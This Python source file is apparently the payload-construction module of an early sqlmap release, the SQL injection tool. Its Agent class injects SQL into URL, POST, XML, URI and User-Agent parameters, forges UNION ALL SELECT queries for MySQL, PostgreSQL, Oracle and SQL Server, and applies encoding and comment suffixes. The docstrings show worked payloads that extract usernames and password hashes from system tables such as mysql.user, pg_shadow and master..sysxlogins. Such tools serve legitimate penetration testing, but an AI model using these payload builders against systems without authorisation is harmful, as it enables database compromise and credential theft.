#!/usr/bin/env python

"""
$Id$

Copyright (c) 2006-2010 sqlmap developers (http://sqlmap.sourceforge.net/)
See the file 'doc/COPYING' for copying permission
"""

import re

from xml.etree import ElementTree as ET

from lib.core.common import getCompiledRegex
from lib.core.common import getInjectionCase
from lib.core.common import randomInt
from lib.core.common import randomStr
from lib.core.convert import urlencode
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import queries
from lib.core.datatype import advancedDict
from lib.core.exception import sqlmapNoneDataException
from lib.core.settings import PAYLOAD_DELIMITER

class Agent:
    """
    This class defines the SQL agent methods.
    """

    def __init__(self):
        kb.misc           = advancedDict()
        kb.misc.delimiter = randomStr(6)
        kb.misc.start     = randomStr(6)
        kb.misc.stop      = randomStr(6)

    def payloadDirect(self, query):
        if query.startswith(" AND "):
            query = query.replace(" AND ", "SELECT ", 1)
        elif query.startswith(" UNION ALL "):
            query = query.replace(" UNION ALL ", "", 1)
        elif query.startswith("; "):
            query = query.replace("; ", "", 1)

        return query

    def payload(self, place=None, parameter=None, value=None, newValue=None, negative=False, falseCond=False):
        """
        This method replaces the affected parameter with the SQL
        injection statement to request
        """

        if conf.direct:
            return self.payloadDirect(newValue)

        falseValue = ""
        negValue   = ""
        retValue   = ""

        if negative or kb.unionNegative:
            negValue = "-"
        elif falseCond or kb.unionFalseCond:
            randInt = randomInt()
            falseValue = " AND %d=%d" % (randInt, randInt + 1)

        # After identifing the injectable parameter
        if kb.injPlace == "User-Agent":
            retValue = kb.injParameter.replace(kb.injParameter,
                                               self.addPayloadDelimiters("%s%s" % (negValue, kb.injParameter + falseValue + newValue)))
        elif kb.injParameter:
            paramString = conf.parameters[kb.injPlace]
            paramDict = conf.paramDict[kb.injPlace]
            value = paramDict[kb.injParameter]

            if "POSTxml" in conf.paramDict and kb.injPlace == "POST":
                root = ET.XML(paramString)
                iterator = root.getiterator(kb.injParameter)

                for child in iterator:
                    child.text = self.addPayloadDelimiters(negValue + value + falseValue + newValue)

                retValue = ET.tostring(root)
            elif kb.injPlace == "URI":
                retValue = paramString.replace("*",
                                               self.addPayloadDelimiters("%s%s" % (negValue, falseValue + newValue)))
            else:
                retValue = paramString.replace("%s=%s" % (kb.injParameter, value),
                                               "%s=%s" % (kb.injParameter, self.addPayloadDelimiters(negValue + value + falseValue + newValue)))

        # Before identifing the injectable parameter
        elif parameter == "User-Agent":
            retValue = value.replace(value, self.addPayloadDelimiters(newValue))
        elif place == "URI":
            retValue = value.replace("*", self.addPayloadDelimiters("%s" % newValue.replace(value, str())))
        else:
            paramString = conf.parameters[place]

            if "POSTxml" in conf.paramDict and place == "POST":
                root = ET.XML(paramString)
                iterator = root.getiterator(parameter)

                for child in iterator:
                    child.text = self.addPayloadDelimiters(newValue)

                retValue = ET.tostring(root)
            else:
                retValue = paramString.replace("%s=%s" % (parameter, value),
                                               "%s=%s" % (parameter, self.addPayloadDelimiters(newValue)))

        return retValue

    def fullPayload(self, query):
        if conf.direct:
            return self.payloadDirect(query)

        query   = self.prefixQuery(query)
        query   = self.postfixQuery(query)
        payload = self.payload(newValue=query)

        return payload

    def prefixQuery(self, string):
        """
        This method defines how the input string has to be escaped
        to perform the injection depending on the injection type
        identified as valid
        """

        if conf.direct:
            return self.payloadDirect(string)

        logic = conf.logic
        query = str()
        case = getInjectionCase(kb.injType)

        if kb.parenthesis is not None:
            parenthesis = kb.parenthesis
        else:
            raise sqlmapNoneDataException, "unable to get the number of parenthesis"

        if case is None:
            raise sqlmapNoneDataException, "unsupported injection type"

        if conf.prefix:
            query = conf.prefix
        else:
            query = case.usage.prefix.format % eval(case.usage.prefix.params)

        query += string

        return query

    def postfixQuery(self, string, comment=None):
        """
        This method appends the DBMS comment to the
        SQL injection request
        """

        if conf.direct:
            return self.payloadDirect(string)

        logic = conf.logic
        case = getInjectionCase(kb.injType)

        if case is None:
            raise sqlmapNoneDataException, "unsupported injection type"

        randInt = randomInt()
        randStr = randomStr()

        if kb.parenthesis is not None:
            parenthesis = kb.parenthesis
        else:
            raise sqlmapNoneDataException, "unable to get the number of parenthesis"

        if comment:
            string += comment

        if conf.postfix:
            string += " %s" % conf.postfix
        else:
            string += case.usage.postfix.format % eval(case.usage.postfix.params)

        return string

    def nullAndCastField(self, field):
        """
        Take in input a field string and return its processed nulled and
        casted field string.

        Examples:

        MySQL input:  VERSION()
        MySQL output: IFNULL(CAST(VERSION() AS CHAR(10000)), ' ')
        MySQL scope:  VERSION()

        PostgreSQL input:  VERSION()
        PostgreSQL output: COALESCE(CAST(VERSION() AS CHARACTER(10000)), ' ')
        PostgreSQL scope:  VERSION()

        Oracle input:  banner
        Oracle output: NVL(CAST(banner AS VARCHAR(4000)), ' ')
        Oracle scope:  SELECT banner FROM v$version WHERE ROWNUM=1

        Microsoft SQL Server input:  @@VERSION
        Microsoft SQL Server output: ISNULL(CAST(@@VERSION AS VARCHAR(8000)), ' ')
        Microsoft SQL Server scope:  @@VERSION

        @param field: field string to be processed
        @type field: C{str}

        @return: field string nulled and casted
        @rtype: C{str}
        """

        # SQLite version 2 does not support neither CAST() nor IFNULL(),
        # introduced only in SQLite version 3
        if kb.dbms == "SQLite":
            return field

        if field.startswith("(CASE"):
            nulledCastedField = field
        else:
            nulledCastedField = queries[kb.dbms].cast.query % field
            nulledCastedField = queries[kb.dbms].isnull.query % nulledCastedField

        return nulledCastedField

    def nullCastConcatFields(self, fields):
        """
        Take in input a sequence of fields string and return its processed
        nulled, casted and concatenated fields string.

        Examples:

        MySQL input:  user,password
        MySQL output: IFNULL(CAST(user AS CHAR(10000)), ' '),'UWciUe',IFNULL(CAST(password AS CHAR(10000)), ' ')
        MySQL scope:  SELECT user, password FROM mysql.user

        PostgreSQL input:  usename,passwd
        PostgreSQL output: COALESCE(CAST(usename AS CHARACTER(10000)), ' ')||'xRBcZW'||COALESCE(CAST(passwd AS CHARACTER(10000)), ' ')
        PostgreSQL scope:  SELECT usename, passwd FROM pg_shadow

        Oracle input:  COLUMN_NAME,DATA_TYPE
        Oracle output: NVL(CAST(COLUMN_NAME AS VARCHAR(4000)), ' ')||'UUlHUa'||NVL(CAST(DATA_TYPE AS VARCHAR(4000)), ' ')
        Oracle scope:  SELECT COLUMN_NAME, DATA_TYPE FROM SYS.ALL_TAB_COLUMNS WHERE TABLE_NAME='%s'

        Microsoft SQL Server input:  name,master.dbo.fn_varbintohexstr(password)
        Microsoft SQL Server output: ISNULL(CAST(name AS VARCHAR(8000)), ' ')+'nTBdow'+ISNULL(CAST(master.dbo.fn_varbintohexstr(password) AS VARCHAR(8000)), ' ')
        Microsoft SQL Server scope:  SELECT name, master.dbo.fn_varbintohexstr(password) FROM master..sysxlogins

        @param fields: fields string to be processed
        @type fields: C{str}

        @return: fields string nulled, casted and concatened
        @rtype: C{str}
        """

        if not kb.dbmsDetected:
            return fields

        fields             = fields.replace(", ", ",")
        fieldsSplitted     = fields.split(",")
        dbmsDelimiter      = queries[kb.dbms].delimiter.query
        nulledCastedFields = []

        for field in fieldsSplitted:
            nulledCastedFields.append(self.nullAndCastField(field))

        delimiterStr = "%s'%s'%s" % (dbmsDelimiter, kb.misc.delimiter, dbmsDelimiter)
        nulledCastedConcatFields = delimiterStr.join([field for field in nulledCastedFields])

        return nulledCastedConcatFields

    def getFields(self, query):
        """
        Take in input a query string and return its fields (columns) and
        more details.

        Example:

        Input:  SELECT user, password FROM mysql.user
        Output: user,password

        @param query: query to be processed
        @type query: C{str}

        @return: query fields (columns) and more details
        @rtype: C{str}
        """
        prefixRegex          = "(?:\s+(?:FIRST|SKIP)\s+\d+)*"
        fieldsSelectTop      = re.search("\ASELECT\s+TOP\s+[\d]+\s+(.+?)\s+FROM", query, re.I)
        fieldsSelectDistinct = re.search("\ASELECT%s\s+DISTINCT\((.+?)\)\s+FROM" % prefixRegex, query, re.I)
        fieldsSelectCase     = re.search("\ASELECT%s\s+(\(CASE WHEN\s+.+\s+END\))" % prefixRegex, query, re.I)
        fieldsSelectFrom     = re.search("\ASELECT%s\s+(.+?)\s+FROM\s+" % prefixRegex, query, re.I)
        fieldsSelect         = re.search("\ASELECT%s\s+(.*)" % prefixRegex, query, re.I)
        fieldsNoSelect       = query

        if fieldsSelectTop:
            fieldsToCastStr = fieldsSelectTop.groups()[0]
        elif fieldsSelectDistinct:
            fieldsToCastStr = fieldsSelectDistinct.groups()[0]
        elif fieldsSelectCase:
            fieldsToCastStr = fieldsSelectCase.groups()[0]
        elif fieldsSelectFrom:
            fieldsToCastStr = fieldsSelectFrom.groups()[0]
        elif fieldsSelect:
            fieldsToCastStr = fieldsSelect.groups()[0]
        elif fieldsNoSelect:
            fieldsToCastStr = fieldsNoSelect
        
        if re.search("\A\w+\(.*\)", fieldsToCastStr, re.I): #function
            fieldsToCastList = [fieldsToCastStr]
        else:
            fieldsToCastList = fieldsToCastStr.replace(", ", ",")
            fieldsToCastList = fieldsToCastList.split(",")

        return fieldsSelectFrom, fieldsSelect, fieldsNoSelect, fieldsSelectTop, fieldsSelectCase, fieldsToCastList, fieldsToCastStr

    def simpleConcatQuery(self, query1, query2):
        concatenatedQuery = ""

        if kb.dbms == "MySQL":
            concatenatedQuery = "CONCAT(%s,%s)" % (query1, query2)

        elif kb.dbms in ( "PostgreSQL", "Oracle", "SQLite" ):
            concatenatedQuery = "%s||%s" % (query1, query2)

        elif kb.dbms == "Microsoft SQL Server":
            concatenatedQuery = "%s+%s" % (query1, query2)

        return concatenatedQuery

    def concatQuery(self, query, unpack=True):
        """
        Take in input a query string and return its processed nulled,
        casted and concatenated query string.

        Examples:

        MySQL input:  SELECT user, password FROM mysql.user
        MySQL output: CONCAT('mMvPxc',IFNULL(CAST(user AS CHAR(10000)), ' '),'nXlgnR',IFNULL(CAST(password AS CHAR(10000)), ' '),'YnCzLl') FROM mysql.user

        PostgreSQL input:  SELECT usename, passwd FROM pg_shadow
        PostgreSQL output: 'HsYIBS'||COALESCE(CAST(usename AS CHARACTER(10000)), ' ')||'KTBfZp'||COALESCE(CAST(passwd AS CHARACTER(10000)), ' ')||'LkhmuP' FROM pg_shadow

        Oracle input:  SELECT COLUMN_NAME, DATA_TYPE FROM SYS.ALL_TAB_COLUMNS WHERE TABLE_NAME='USERS'
        Oracle output: 'GdBRAo'||NVL(CAST(COLUMN_NAME AS VARCHAR(4000)), ' ')||'czEHOf'||NVL(CAST(DATA_TYPE AS VARCHAR(4000)), ' ')||'JVlYgS' FROM SYS.ALL_TAB_COLUMNS WHERE TABLE_NAME='USERS'

        Microsoft SQL Server input:  SELECT name, master.dbo.fn_varbintohexstr(password) FROM master..sysxlogins
        Microsoft SQL Server output: 'QQMQJO'+ISNULL(CAST(name AS VARCHAR(8000)), ' ')+'kAtlqH'+ISNULL(CAST(master.dbo.fn_varbintohexstr(password) AS VARCHAR(8000)), ' ')+'lpEqoi' FROM master..sysxlogins

        @param query: query string to be processed
        @type query: C{str}

        @return: query string nulled, casted and concatenated
        @rtype: C{str}
        """

        if unpack:
            concatenatedQuery = ""
            query             = query.replace(", ", ",")

            fieldsSelectFrom, fieldsSelect, fieldsNoSelect, fieldsSelectTop, fieldsSelectCase, _, fieldsToCastStr = self.getFields(query)
            castedFields      = self.nullCastConcatFields(fieldsToCastStr)
            concatenatedQuery = query.replace(fieldsToCastStr, castedFields, 1)
        else:
            concatenatedQuery = query
            fieldsSelectFrom, fieldsSelect, fieldsNoSelect, fieldsSelectTop, fieldsSelectCase, _, fieldsToCastStr = self.getFields(query)

        if kb.dbms == "MySQL":
            if fieldsSelectCase:
                concatenatedQuery  = concatenatedQuery.replace("SELECT ", "CONCAT('%s'," % kb.misc.start, 1)
                concatenatedQuery += ",'%s')" % kb.misc.stop
            elif fieldsSelectFrom:
                concatenatedQuery = concatenatedQuery.replace("SELECT ", "CONCAT('%s'," % kb.misc.start, 1)
                concatenatedQuery = concatenatedQuery.replace(" FROM ", ",'%s') FROM " % kb.misc.stop, 1)
            elif fieldsSelect:
                concatenatedQuery  = concatenatedQuery.replace("SELECT ", "CONCAT('%s'," % kb.misc.start, 1)
                concatenatedQuery += ",'%s')" % kb.misc.stop
            elif fieldsNoSelect:
                concatenatedQuery = "CONCAT('%s',%s,'%s')" % (kb.misc.start, concatenatedQuery, kb.misc.stop)

        elif kb.dbms in ( "PostgreSQL", "Oracle", "SQLite" ):
            if fieldsSelectCase:
                concatenatedQuery  = concatenatedQuery.replace("SELECT ", "'%s'||" % kb.misc.start, 1)
                concatenatedQuery += "||'%s'" % kb.misc.stop
            elif fieldsSelectFrom:
                concatenatedQuery = concatenatedQuery.replace("SELECT ", "'%s'||" % kb.misc.start, 1)
                concatenatedQuery = concatenatedQuery.replace(" FROM ", "||'%s' FROM " % kb.misc.stop, 1)
            elif fieldsSelect:
                concatenatedQuery  = concatenatedQuery.replace("SELECT ", "'%s'||" % kb.misc.start, 1)
                concatenatedQuery += "||'%s'" % kb.misc.stop
            elif fieldsNoSelect:
                concatenatedQuery = "'%s'||%s||'%s'" % (kb.misc.start, concatenatedQuery, kb.misc.stop)

            if kb.dbms == "Oracle" and " FROM " not in concatenatedQuery and ( fieldsSelect or fieldsNoSelect ):
                concatenatedQuery += " FROM DUAL"

        elif kb.dbms == "Microsoft SQL Server":
            if fieldsSelectTop:
                topNum = re.search("\ASELECT\s+TOP\s+([\d]+)\s+", concatenatedQuery, re.I).group(1)
                concatenatedQuery = concatenatedQuery.replace("SELECT TOP %s " % topNum, "TOP %s '%s'+" % (topNum, kb.misc.start), 1)
                concatenatedQuery = concatenatedQuery.replace(" FROM ", "+'%s' FROM " % kb.misc.stop, 1)
            elif fieldsSelectCase:
                concatenatedQuery  = concatenatedQuery.replace("SELECT ", "'%s'+" % kb.misc.start, 1)
                concatenatedQuery += "+'%s'" % kb.misc.stop
            elif fieldsSelectFrom:
                concatenatedQuery = concatenatedQuery.replace("SELECT ", "'%s'+" % kb.misc.start, 1)
                concatenatedQuery = concatenatedQuery.replace(" FROM ", "+'%s' FROM " % kb.misc.stop, 1)
            elif fieldsSelect:
                concatenatedQuery  = concatenatedQuery.replace("SELECT ", "'%s'+" % kb.misc.start, 1)
                concatenatedQuery += "+'%s'" % kb.misc.stop
            elif fieldsNoSelect:
                concatenatedQuery = "'%s'+%s+'%s'" % (kb.misc.start, concatenatedQuery, kb.misc.stop)

        return concatenatedQuery

    def forgeInbandQuery(self, query, exprPosition=None, nullChar="NULL"):
        """
        Take in input an query (pseudo query) string and return its
        processed UNION ALL SELECT query.

        Examples:

        MySQL input:  CONCAT(CHAR(120,121,75,102,103,89),IFNULL(CAST(user AS CHAR(10000)), CHAR(32)),CHAR(106,98,66,73,109,81),IFNULL(CAST(password AS CHAR(10000)), CHAR(32)),CHAR(105,73,99,89,69,74)) FROM mysql.user
        MySQL output:  UNION ALL SELECT NULL, CONCAT(CHAR(120,121,75,102,103,89),IFNULL(CAST(user AS CHAR(10000)), CHAR(32)),CHAR(106,98,66,73,109,81),IFNULL(CAST(password AS CHAR(10000)), CHAR(32)),CHAR(105,73,99,89,69,74)), NULL FROM mysql.user-- AND 7488=7488

        PostgreSQL input:  (CHR(116)||CHR(111)||CHR(81)||CHR(80)||CHR(103)||CHR(70))||COALESCE(CAST(usename AS CHARACTER(10000)), (CHR(32)))||(CHR(106)||CHR(78)||CHR(121)||CHR(111)||CHR(84)||CHR(85))||COALESCE(CAST(passwd AS CHARACTER(10000)), (CHR(32)))||(CHR(108)||CHR(85)||CHR(122)||CHR(85)||CHR(108)||CHR(118)) FROM pg_shadow
        PostgreSQL output:  UNION ALL SELECT NULL, (CHR(116)||CHR(111)||CHR(81)||CHR(80)||CHR(103)||CHR(70))||COALESCE(CAST(usename AS CHARACTER(10000)), (CHR(32)))||(CHR(106)||CHR(78)||CHR(121)||CHR(111)||CHR(84)||CHR(85))||COALESCE(CAST(passwd AS CHARACTER(10000)), (CHR(32)))||(CHR(108)||CHR(85)||CHR(122)||CHR(85)||CHR(108)||CHR(118)), NULL FROM pg_shadow-- AND 7133=713

        Oracle input:  (CHR(109)||CHR(89)||CHR(75)||CHR(109)||CHR(85)||CHR(68))||NVL(CAST(COLUMN_NAME AS VARCHAR(4000)), (CHR(32)))||(CHR(108)||CHR(110)||CHR(89)||CHR(69)||CHR(122)||CHR(90))||NVL(CAST(DATA_TYPE AS VARCHAR(4000)), (CHR(32)))||(CHR(89)||CHR(80)||CHR(98)||CHR(77)||CHR(80)||CHR(121)) FROM SYS.ALL_TAB_COLUMNS WHERE TABLE_NAME=(CHR(85)||CHR(83)||CHR(69)||CHR(82)||CHR(83))
        Oracle output:  UNION ALL SELECT NULL, (CHR(109)||CHR(89)||CHR(75)||CHR(109)||CHR(85)||CHR(68))||NVL(CAST(COLUMN_NAME AS VARCHAR(4000)), (CHR(32)))||(CHR(108)||CHR(110)||CHR(89)||CHR(69)||CHR(122)||CHR(90))||NVL(CAST(DATA_TYPE AS VARCHAR(4000)), (CHR(32)))||(CHR(89)||CHR(80)||CHR(98)||CHR(77)||CHR(80)||CHR(121)), NULL FROM SYS.ALL_TAB_COLUMNS WHERE TABLE_NAME=(CHR(85)||CHR(83)||CHR(69)||CHR(82)||CHR(83))-- AND 6738=6738

        Microsoft SQL Server input:  (CHAR(74)+CHAR(86)+CHAR(106)+CHAR(116)+CHAR(116)+CHAR(108))+ISNULL(CAST(name AS VARCHAR(8000)), (CHAR(32)))+(CHAR(89)+CHAR(87)+CHAR(116)+CHAR(100)+CHAR(106)+CHAR(74))+ISNULL(CAST(master.dbo.fn_varbintohexstr(password) AS VARCHAR(8000)), (CHAR(32)))+(CHAR(71)+CHAR(74)+CHAR(68)+CHAR(66)+CHAR(85)+CHAR(106)) FROM master..sysxlogins
        Microsoft SQL Server output:  UNION ALL SELECT NULL, (CHAR(74)+CHAR(86)+CHAR(106)+CHAR(116)+CHAR(116)+CHAR(108))+ISNULL(CAST(name AS VARCHAR(8000)), (CHAR(32)))+(CHAR(89)+CHAR(87)+CHAR(116)+CHAR(100)+CHAR(106)+CHAR(74))+ISNULL(CAST(master.dbo.fn_varbintohexstr(password) AS VARCHAR(8000)), (CHAR(32)))+(CHAR(71)+CHAR(74)+CHAR(68)+CHAR(66)+CHAR(85)+CHAR(106)), NULL FROM master..sysxlogins-- AND 3254=3254

        @param query: it is a processed query string unescaped to be
        forged within an UNION ALL SELECT statement
        @type query: C{str}

        @param exprPosition: it is the NULL position where it is possible
        to inject the query
        @type exprPosition: C{int}

        @return: UNION ALL SELECT query string forged
        @rtype: C{str}
        """

        inbandQuery = self.prefixQuery("UNION ALL SELECT ")

        if query.startswith("TOP"):
            topNum       = re.search("\ATOP\s+([\d]+)\s+", query, re.I).group(1)
            query        = query[len("TOP %s " % topNum):]
            inbandQuery += "TOP %s " % topNum

        if not isinstance(exprPosition, int):
            exprPosition = kb.unionPosition

        intoRegExp = re.search("(\s+INTO (DUMP|OUT)FILE\s+\'(.+?)\')", query, re.I)

        if intoRegExp:
            intoRegExp = intoRegExp.group(1)
            query = query[:query.index(intoRegExp)]

        if kb.dbms == "Oracle" and inbandQuery.endswith(" FROM DUAL"):
            inbandQuery = inbandQuery[:-len(" FROM DUAL")]

        for element in range(kb.unionCount):
            if element > 0:
                inbandQuery += ", "

            if element == exprPosition:
                if " FROM " in query and not query.startswith("SELECT ") and "(CASE WHEN (" not in query:
                    conditionIndex = query.index(" FROM ")
                    inbandQuery += query[:conditionIndex]
                else:
                    inbandQuery += query
            else:
                inbandQuery += nullChar

        if " FROM " in query and not query.startswith("SELECT ") and "(CASE WHEN (" not in query:
            conditionIndex = query.index(" FROM ")
            inbandQuery += query[conditionIndex:]

        if kb.dbms == "Oracle":
            if " FROM " not in inbandQuery:
                inbandQuery += " FROM DUAL"

        if intoRegExp:
            inbandQuery += intoRegExp

        inbandQuery = self.postfixQuery(inbandQuery, kb.unionComment)

        return inbandQuery

    def limitQuery(self, num, query, field=None):
        """
        Take in input a query string and return its limited query string.

        Example:

        Input:  SELECT user FROM mysql.users
        Output: SELECT user FROM mysql.users LIMIT <num>, 1

        @param num: limit number
        @type num: C{int}

        @param query: query to be processed
        @type query: C{str}

        @param field: field within the query
        @type field: C{list}

        @return: limited query string
        @rtype: C{str}
        """

        limitedQuery = query
        limitStr = queries[kb.dbms].limit.query
        fromIndex = limitedQuery.index(" FROM ")
        untilFrom = limitedQuery[:fromIndex]
        fromFrom = limitedQuery[fromIndex+1:]
        orderBy = False

        if kb.dbms in ( "MySQL", "PostgreSQL", "SQLite" ):
            limitStr = queries[kb.dbms].limit.query % (num, 1)
            limitedQuery += " %s" % limitStr
            
        elif kb.dbms == "Firebird":
            limitStr = queries[kb.dbms].limit.query % (num+1, num+1)
            limitedQuery += " %s" % limitStr

        elif kb.dbms == "Oracle":
            if " ORDER BY " in limitedQuery and "(SELECT " in limitedQuery:
                orderBy = limitedQuery[limitedQuery.index(" ORDER BY "):]
                limitedQuery = limitedQuery[:limitedQuery.index(" ORDER BY ")]

            if query.startswith("SELECT "):
                limitedQuery = "%s FROM (%s, %s" % (untilFrom, untilFrom, limitStr)
            else:
                limitedQuery = "%s FROM (SELECT %s, %s" % (untilFrom, ", ".join(f for f in field), limitStr)
            limitedQuery  = limitedQuery % fromFrom
            limitedQuery += "=%d" % (num + 1)

        elif kb.dbms == "Microsoft SQL Server":
            forgeNotIn = True

            if " ORDER BY " in limitedQuery:
                orderBy = limitedQuery[limitedQuery.index(" ORDER BY "):]
                limitedQuery = limitedQuery[:limitedQuery.index(" ORDER BY ")]

            notDistincts = re.findall("DISTINCT[\(\s+](.+?)\)*\s+", limitedQuery, re.I)

            for notDistinct in notDistincts:
                limitedQuery = limitedQuery.replace("DISTINCT(%s)" % notDistinct, notDistinct)
                limitedQuery = limitedQuery.replace("DISTINCT %s" % notDistinct, notDistinct)

            if limitedQuery.startswith("SELECT TOP ") or limitedQuery.startswith("TOP "):
                topNums         = re.search(queries[kb.dbms].limitregexp.query, limitedQuery, re.I)

                if topNums:
                    topNums = topNums.groups()
                    quantityTopNums = topNums[0]
                    limitedQuery    = limitedQuery.replace("TOP %s" % quantityTopNums, "TOP 1", 1)
                    startTopNums    = topNums[1]
                    limitedQuery    = limitedQuery.replace(" (SELECT TOP %s" % startTopNums, " (SELECT TOP %d" % num)
                    forgeNotIn      = False
                else:
                    topNum          = re.search("TOP\s+([\d]+)\s+", limitedQuery, re.I).group(1)
                    limitedQuery    = limitedQuery.replace("TOP %s " % topNum, "")

            if forgeNotIn:
                limitedQuery = limitedQuery.replace("SELECT ", (limitStr % 1), 1)

                if " WHERE " in limitedQuery:
                    limitedQuery  = "%s AND %s " % (limitedQuery, field)
                else:
                    limitedQuery  = "%s WHERE %s " % (limitedQuery, field)

                limitedQuery += "NOT IN (%s" % (limitStr % num)
                limitedQuery += "%s %s)" % (field, fromFrom)

        if orderBy:
            limitedQuery += orderBy

        return limitedQuery

    def forgeCaseStatement(self, expression):
        """
        Take in input a query string and return its CASE statement query
        string.

        Example:

        Input:  (SELECT super_priv FROM mysql.user WHERE user=(SUBSTRING_INDEX(CURRENT_USER(), '@', 1)) LIMIT 0, 1)='Y'
        Output: SELECT (CASE WHEN ((SELECT super_priv FROM mysql.user WHERE user=(SUBSTRING_INDEX(CURRENT_USER(), '@', 1)) LIMIT 0, 1)='Y') THEN 1 ELSE 0 END)

        @param expression: expression to be processed
        @type num: C{str}

        @return: processed expression
        @rtype: C{str}
        """

        return queries[kb.dbms].case.query % expression

    def addPayloadDelimiters(self, inpStr):
        """
        Adds payload delimiters around the input string
        """
        retVal = inpStr

        if inpStr:
            retVal = "%s%s%s" % (PAYLOAD_DELIMITER, inpStr, PAYLOAD_DELIMITER)

        return retVal

    def removePayloadDelimiters(self, inpStr, urlencode_=True):
        """
        Removes payload delimiters from inside the input string
        """
        retVal = inpStr

        if inpStr:
            if urlencode_:
                regObj = getCompiledRegex("(?P<result>%s.*?%s)" % (PAYLOAD_DELIMITER, PAYLOAD_DELIMITER))

                for match in regObj.finditer(inpStr):
                    retVal = retVal.replace(match.group("result"), urlencode(match.group("result").strip(PAYLOAD_DELIMITER), convall=True))
            else:
                retVal = retVal.replace(PAYLOAD_DELIMITER, '')

        return retVal

    def extractPayload(self, inpStr):
        """
        Extracts payload from inside of the input string
        """
        retVal = None

        if inpStr:
            regObj = getCompiledRegex("%s(?P<result>.*?)%s" % (PAYLOAD_DELIMITER, PAYLOAD_DELIMITER))
            match = regObj.search(inpStr)

            if match:
                retVal = match.group("result")

        return retVal

    def replacePayload(self, inpStr, payload):
        """
        Replaces payload inside the input string with a given payload
        """
        retVal = inpStr

        if inpStr:
            regObj = getCompiledRegex("(%s.*?%s)" % (PAYLOAD_DELIMITER, PAYLOAD_DELIMITER))
            retVal = regObj.sub("%s%s%s" % (PAYLOAD_DELIMITER, payload, PAYLOAD_DELIMITER), inpStr)

        return retVal

# SQL agent
agent = Agent()
